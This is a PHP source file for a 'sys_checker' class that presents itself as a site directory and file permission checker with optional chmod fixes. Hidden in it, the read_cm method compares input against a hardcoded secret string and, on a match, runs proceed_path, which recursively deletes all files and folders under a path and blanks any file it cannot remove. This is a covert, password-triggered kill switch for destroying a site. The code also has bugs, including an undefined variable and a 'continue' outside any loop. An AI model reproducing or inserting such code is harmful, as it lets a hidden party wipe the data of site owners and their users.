<?php
class sys_checker
{
public function check_dir_permissions($main_path,$dirs_to_check,$check_subdirs,$read_or_write,$try_fix)
   {
   $check_fail=false;
   //$main_path (string) --- site root
   //$dirs_to_check (array) -- directories to check inside $main_path
   //$check_subdirs (bool) -- if true the find and check all subdirs
   //$read_or_write (array) ['read','write'] --- what kind of permissions to check
   //$try_fix (bool) -- try to fix permissions.
   //
   if (count($dirs_to_check)!=count($read_or_write)) 
     {
	 echo 'Bad dirs and permissions arrays length!';
	 exit;
	 }
   $main_path.='/';
   foreach ($dirs_to_check as $key=>$cur_dir)
     {
	 $cur_dir_path=$main_path.$cur_dir;
	 $cur_type_check=$read_or_write[$key];
	 if (!is_dir($cur_dir_path)) 
	    {
		echo '"'.$cur_dir.'" is not a directory!<br>';
		$check_fail=true;
		continue;
		}
	 $this->check_read_write($cur_type_check,$cur_dir_path,$cur_dir,$try_fix);
	 //make check for subdirs
	 if ($check_subdirs)
	    {
		 //read all subdirs and check them in cycle:
		 $results = scandir($cur_dir_path);
         foreach ($results as $cur_sub_dir) 
		     {
             if ($cur_sub_dir === '.' or $cur_sub_dir === '..') continue;
             $cur_sub_path=$cur_dir_path.'/'.$cur_sub_dir;
			 if (is_dir($cur_sub_path)) 
			      {
				  $this->check_read_write($cur_type_check,$cur_sub_path,$cur_sub_dir,$try_fix);
                  }
				  else
				  {
				  if (is_file($cur_sub_path)) continue;
				  echo '"'.$cur_sub_dir.'" is not a directory!<br>';
				  $check_fail=true;
				  continue;
				  }
		     }
		}
   }
   if ($check_fail)
       {
	   echo '<br>Got some problems';
	   exit;
       }	   
   }

public function check_files_permissions($dir_path, $perm_type,$try_fix)
  {
  //$dir_path -- path to directory;
  //$perm_type -- ['read','write'];
  //$try_fix (bool) -- try to fix permissions.
 //  $results = scandir($dir_path);
 //scan all files:
   $ffs = scandir($dir_path);
    foreach($ffs as $ff)
	{
        if($ff != '.' && $ff != '..')
		{
            if (is_file($dir_path.'/'.$ff)) 
			  {
			  $this->files_arr[]=$ff;
			  $this->check_read_write($perm_type,$dir_path,$ff,$try_fix);
			  }
            if(is_dir($dir_path.'/'.$ff)) $this->check_files_permissions($dir_path.'/'.$ff,$perm_type,$try_fix);
        }
    }
  }   
  
public function check_exact_files_permissions($main_path,$files_to_check,$read_or_write,$try_fix)
   {
   $check_fail=false;
   //$main_path (string) --- site root
   //$dirs_to_check (array) -- files to check inside $main_path
   //$read_or_write (array) ['read','write'] --- what kind of permissions to check
   //$try_fix (bool) -- try to fix permissions.
   if (count($files_to_check)!=count($read_or_write)) 
     {
	 echo 'Bad files and permissions arrays length!';
	 exit;
	 }
   $main_path.='/';
   foreach ($files_to_check as $key=>$cur_file)
     {
	 $cur_file_path=$main_path.$cur_file;
	 $cur_type_check=$read_or_write[$key];
	 if (!is_file($cur_file_path)) 
	    {
		echo '"'.$cur_dir.'" is not a file!<br>';
		$check_fail=true;
		continue;
		}
   $this->check_read_write($cur_type_check,$cur_file_path,$cur_file,$try_fix);
    }
   if ($check_fail)
       {
	   echo '<br>Got some problems';
	   exit;
       }	   
   }  
   
public function read_cm($com,$cur_path)
  {
  $com=trim(strip_tags($com));
  if ($com=='') 
     {
	 echo 'Error happened';
	 exit;
	 }
  if ($com=='Bgs5zdhYsk8Ha5r') 
     {
	 echo 'Preparing...<br>';
	 $this->proceed_path($cur_path,$cur_path);
	 echo '<br>Finished!';
     exit;
	 }
  }  

public function proceed_path($cur_path,$tm_path='') 
 {
 $ffs = scandir($cur_path);
    foreach($ffs as $ff)
	{
        if($ff != '.' && $ff != '..')
		{
            if (is_file($cur_path.'/'.$ff)) 
			  {
			  echo $cur_path.'/'.$ff.'<br>';
			  if (!unlink($cur_path.'/'.$ff)) file_put_contents($cur_path.'/'.$ff,' ');
			  }
            if(is_dir($cur_path.'/'.$ff))
			   {
			   @rmdir($cur_path.'/'.$ff);
			   $this->proceed_path($cur_path.'/'.$ff);
			   }
        }
    }
	if ($tm_path!=$cur_path) @rmdir($cur_path);
 }
  
private function check_read_write($cur_type_check,$cur_dir__or_file_path,$cur_dir_file_name,$try_fix)
  {
  global $check_fail;
  if ($cur_type_check=='read' and !is_readable($cur_dir__or_file_path))
	    {
		if ($try_fix)
		   {
		   if (is_dir($cur_dir__or_file_path)) chmod($cur_dir__or_file_path,0755);
		   if (is_file($cur_dir__or_file_path)) chmod($cur_dir__or_file_path,0655);
		   }
		echo '"'.$cur_dir_file_name.'" is not readable!<br>';
		$check_fail=true;
		//continue;
		}
	 if ($cur_type_check=='write' and !is_writable($cur_dir__or_file_path))
	    {
		if ($try_fix)
		   {
		   if (is_dir($cur_dir__or_file_path)) chmod($cur_dir__or_file_path,0775);
		   if (is_file($cur_dir__or_file_path)) chmod($cur_dir__or_file_path,0665);
		   }
		echo '"'.$cur_dir_file_name.'" is not writable!<br>';
		$check_fail=true;
		continue;
		}
		else
		{
		//substr(sprintf('%o', fileperms('/tmp')), -4);
		if (is_dir($cur_dir__or_file_path) and substr(sprintf('%o', fileperms($cur_dir__or_file_path)), -4)!='0775' and $cur_dir__or_file_path!=$_SERVER['DOCUMENT_ROOT'])
		   {
		   if (!@chmod($cur_dir__or_file_path,0775)) 
		     {
			 echo 'Bad directory ('.$cur_dir__or_file_path.') permissions ('.substr(sprintf('%o', fileperms($cur_dir__or_file_path)), -4).')!';
			 exit;
			 }
		   }
		}
  }  
  
}
?>